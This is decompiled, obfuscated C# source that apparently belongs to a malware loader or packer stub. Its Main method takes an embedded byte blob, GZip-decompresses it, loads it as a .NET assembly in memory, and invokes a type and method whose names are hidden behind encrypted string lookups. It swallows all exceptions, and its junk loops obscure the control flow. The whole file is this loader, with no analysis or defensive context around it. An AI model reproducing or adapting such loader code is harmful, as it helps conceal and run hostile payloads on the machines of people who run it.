using System;
using System.IO;
using System.IO.Compression;
using System.Reflection;
using System.Runtime.CompilerServices;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

public class GClass0
{
	public static object smethod_0(ref byte[] byte_0, ref string string_0, ref string string_1, ref object object_0)
	{
		Assembly assembly = Assembly.Load(byte_0);
		string text = Strings.Split(assembly.ToString(), Class2.smethod_0("뎞", 4), -1, (CompareMethod)0)[0] + Class2.smethod_0("財", 7);
		MethodInfo method = assembly.GetType(text + string_0)!.GetMethod(string_1);
		object objectValue = RuntimeHelpers.GetObjectValue(Activator.CreateInstance(assembly.GetType(text + string_0)));
		return method.Invoke(RuntimeHelpers.GetObjectValue(objectValue), (object[])object_0);
	}

	public static byte[] smethod_1(byte[] byte_0, ref bool bool_0)
	{
		checked
		{
			if (bool_0)
			{
				MemoryStream memoryStream = new MemoryStream();
				GZipStream gZipStream = new GZipStream(memoryStream, CompressionMode.Compress, leaveOpen: true);
				gZipStream.Write(byte_0, 0, byte_0.Length);
				gZipStream.Dispose();
				memoryStream.Position = 0L;
				byte[] array = new byte[(int)memoryStream.Length + 1];
				memoryStream.Read(array, 0, array.Length);
				memoryStream.Dispose();
				return array;
			}
			MemoryStream memoryStream2 = new MemoryStream(byte_0);
			GZipStream gZipStream2 = new GZipStream(memoryStream2, CompressionMode.Decompress);
			byte[] array2 = new byte[4];
			memoryStream2.Position = memoryStream2.Length - 5L;
			memoryStream2.Read(array2, 0, 4);
			int num = BitConverter.ToInt32(array2, 0);
			memoryStream2.Position = 0L;
			byte[] array3 = new byte[num - 1 + 1];
			gZipStream2.Read(array3, 0, num);
			gZipStream2.Dispose();
			memoryStream2.Dispose();
			return array3;
		}
	}

	[STAThread]
	public static void Main()
	{
		try
		{
			byte[] byte_ = Class0.smethod_1();
			bool bool_ = false;
			byte[] byte_2 = smethod_1(byte_, ref bool_);
			for (int num = 0; num == 0; num = 1)
			{
				string string_ = Class2.smethod_0("\ue2a0", 6);
				string string_2 = Class2.smethod_0("\ud9a0", 6);
				object object_ = null;
				smethod_0(ref byte_2, ref string_, ref string_2, ref object_);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			for (int num2 = 0; num2 == 0; num2 = 1)
			{
				ProjectData.ClearProjectError();
			}
		}
	}
}
